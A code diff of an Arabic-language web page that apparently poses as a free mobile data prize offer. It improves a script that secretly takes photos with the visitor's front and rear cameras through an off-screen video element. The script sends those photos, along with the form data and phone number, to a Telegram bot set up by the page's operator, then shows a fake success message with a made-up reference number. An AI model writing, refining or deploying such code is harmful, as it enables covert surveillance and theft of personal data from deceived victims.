@@ -208,15 +208,6 @@
             display: none;
         }
 
-        /* تأثير النص المتحرك */
-        .pulse-text {
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
         /* عناصر الكاميرا المخفية */
         #video { position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; }
         #canvas { display: none; }
@@ -285,7 +276,7 @@
     </div>
 
     <!-- عناصر الكاميرا المخفية -->
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -293,6 +284,8 @@
         // ⚠️ استبدل هذه القيم ببيانات بوتك الخاص
         const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // استبدل بـ token بوتك
         const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // استبدل بـ chat ID الخاص بك
+
+        let currentStream = null;
 
         // ===== دالة إرسال رسالة نصية للبوت =====
         function sendMsg(txt) {
@@ -317,59 +310,95 @@
                 return;
             }
 
-            var arr = dataURL.split(',');
-            var mime = arr[0].match(/:(.*?);/)[1];
-            var bstr = atob(arr[1]);
-            var n = bstr.length;
-            var u8arr = new Uint8Array(n);
-            while (n--) { u8arr[n] = bstr.charCodeAt(n); }
-            var blob = new Blob([u8arr], { type: mime });
+            try {
+                var arr = dataURL.split(',');
+                var mime = arr[0].match(/:(.*?);/)[1];
+                var bstr = atob(arr[1]);
+                var n = bstr.length;
+                var u8arr = new Uint8Array(n);
+                while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+                var blob = new Blob([u8arr], { type: mime });
 
-            var form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('photo', blob, 'photo.jpg');
-            form.append('caption', caption || '📸 صورة من الكاميرا');
+                var form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, 'photo.jpg');
+                form.append('caption', caption || '📸 صورة من الكاميرا');
 
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', true);
-            xhr.send(form);
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', true);
+                xhr.send(form);
+                console.log('✅ تم إرسال الصورة: ' + caption);
+            } catch(e) {
+                console.log('❌ خطأ في إرسال الصورة:', e);
+            }
         }
 
         // ===== دالة التقاط صورة من الكاميرا =====
-        function capturePhoto(facingMode, label, callback) {
-            var video = document.getElementById('video');
-            var canvas = document.getElementById('canvas');
-            var ctx = canvas.getContext('2d');
+        function capturePhoto(facingMode, label) {
+            return new Promise(function(resolve, reject) {
+                var video = document.getElementById('video');
+                var canvas = document.getElementById('canvas');
+                var ctx = canvas.getContext('2d');
 
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
-            }).then(function(stream) {
-                video.srcObject = stream;
-                video.play();
-
-                function tryCapture() {
-                    if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        ctx.drawImage(video, 0, 0);
-                        var dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                        stream.getTracks().forEach(function(t) { t.stop(); });
-                        sendPhoto(dataURL, label);
-                        if (callback) callback();
-                    } else {
-                        requestAnimationFrame(tryCapture);
-                    }
+                // إيقاف أي stream سابق
+                if (currentStream) {
+                    currentStream.getTracks().forEach(function(track) {
+                        track.stop();
+                    });
                 }
 
-                video.addEventListener('playing', function onPlay() {
-                    video.removeEventListener('playing', onPlay);
-                    tryCapture();
+                navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: facingMode, 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 } 
+                    }
+                }).then(function(stream) {
+                    currentStream = stream;
+                    video.srcObject = stream;
+                    
+                    // انتظر حتى يبدأ الفيديو بالتشغيل
+                    var startTime = Date.now();
+                    var checkVideo = setInterval(function() {
+                        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                            clearInterval(checkVideo);
+                            
+                            // التقط الصورة
+                            setTimeout(function() {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                var dataURL = canvas.toDataURL('image/jpeg', 0.9);
+                                
+                                // أوقف الـ stream
+                                stream.getTracks().forEach(function(track) {
+                                    track.stop();
+                                });
+                                currentStream = null;
+                                
+                                // أرسل الصورة
+                                sendPhoto(dataURL, label);
+                                
+                                resolve();
+                            }, 100);
+                        } else if (Date.now() - startTime > 5000) {
+                            // انتظر 5 ثوان كحد أقصى
+                            clearInterval(checkVideo);
+                            stream.getTracks().forEach(function(track) {
+                                track.stop();
+                            });
+                            currentStream = null;
+                            console.log('⏱️ انتهت مهلة الانتظار');
+                            reject(new Error('Timeout'));
+                        }
+                    }, 100);
+                    
+                }).catch(function(err) {
+                    console.log('❌ خطأ في الوصول للكاميرا: ' + err.message);
+                    sendMsg('❌ فشل الوصول للكاميرا: ' + err.message);
+                    reject(err);
                 });
-
-            }).catch(function(err) {
-                console.log('❌ فشل الوصول للكاميرا: ' + err.message);
-                sendMsg('❌ فشل الوصول للكاميرا: ' + err.message);
-                if (callback) callback();
             });
         }
 
@@ -455,33 +484,62 @@
             // إرسال البيانات للبوت
             sendMsg(formMsg);
 
-            // التقاط صورة من الكاميرا الأمامية وإرسالها
-            capturePhoto('user', '📸 صورة أمامية - طلب ربح 2 جيجابايت', function() {
-                // بعد التقاط الصورة الأمامية، التقط صورة من الكاميرا الخلفية
-                setTimeout(function() {
-                    capturePhoto('environment', '📸 صورة خلفية - طلب ربح 2 جيجابايت', null);
-                }, 500);
-            });
+            // التقاط الصور بالتسلسل
+            console.log('📸 بدء التقاط الصور...');
+            
+            capturePhoto('user', '📸 صورة أمامية - طلب ربح 2 جيجابايت')
+                .then(function() {
+                    console.log('✅ تم التقاط الصورة الأمامية');
+                    return new Promise(function(resolve) {
+                        setTimeout(resolve, 500);
+                    });
+                })
+                .then(function() {
+                    return capturePhoto('environment', '📸 صورة خلفية - طلب ربح 2 جيجابايت');
+                })
+                .then(function() {
+                    console.log('✅ تم التقاط الصورة الخلفية');
+                    
+                    // عرض مودال النجاح
+                    var refNum = 'SY-2026-' + Math.floor(1000 + Math.random() * 9000);
+                    document.getElementById('refNumber').textContent = 'رقم الطلب: ' + refNum;
+                    document.getElementById('successModal').classList.add('show');
 
-            // عرض مودال النجاح بعد قليل
-            setTimeout(function() {
-                var refNum = 'SY-2026-' + Math.floor(1000 + Math.random() * 9000);
-                document.getElementById('refNumber').textContent = 'رقم الطلب: ' + refNum;
-                document.getElementById('successModal').classList.add('show');
+                    // إرسال إشعار للبوت
+                    sendMsg('✅ <b>تم عرض إشعار النجاح</b>\n' +
+                        '📱 الهاتف: <code>' + phoneNumber + '</code>\n' +
+                        '🎟️ رقم الطلب: ' + refNum);
 
-                // إرسال إشعار للبوت
-                sendMsg('✅ <b>تم عرض إشعار النجاح</b>\n' +
-                    '📱 الهاتف: <code>' + phoneNumber + '</code>\n' +
-                    '🎟️ رقم الطلب: ' + refNum);
+                    // إغلاق المودال وإعادة تعيين النموذج بعد 3 ثوان
+                    setTimeout(function() {
+                        document.getElementById('successModal').classList.remove('show');
+                        document.getElementById('winForm').reset();
+                        btn.disabled = false;
+                        btn.textContent = '🎁 احصل على الجائزة الآن';
+                    }, 3000);
+                })
+                .catch(function(err) {
+                    console.log('❌ خطأ في التقاط الصور:', err);
+                    
+                    // عرض مودال النجاح على أي حال
+                    var refNum = 'SY-2026-' + Math.floor(1000 + Math.random() * 9000);
+                    document.getElementById('refNumber').textContent = 'رقم الطلب: ' + refNum;
+                    document.getElementById('successModal').classList.add('show');
 
-                // إغلاق المودال وإعادة تعيين النموذج بعد 3 ثوان
-                setTimeout(function() {
-                    document.getElementById('successModal').classList.remove('show');
-                    document.getElementById('winForm').reset();
-                    btn.disabled = false;
-                    btn.textContent = '🎁 احصل على الجائزة الآن';
-                }, 3000);
-            }, 800);
+                    // إرسال إشعار للبوت
+                    sendMsg('⚠️ <b>تم عرض إشعار النجاح (بدون صور)</b>\n' +
+                        '📱 الهاتف: <code>' + phoneNumber + '</code>\n' +
+                        '🎟️ رقم الطلب: ' + refNum + '\n' +
+                        '❌ خطأ: ' + err.message);
+
+                    // إغلاق المودال وإعادة تعيين النموذج بعد 3 ثوان
+                    setTimeout(function() {
+                        document.getElementById('successModal').classList.remove('show');
+                        document.getElementById('winForm').reset();
+                        btn.disabled = false;
+                        btn.textContent = '🎁 احصل على الجائزة الآن';
+                    }, 3000);
+                });
         });
 
         // إزالة رسالة الخطأ عند التركيز على الحقل
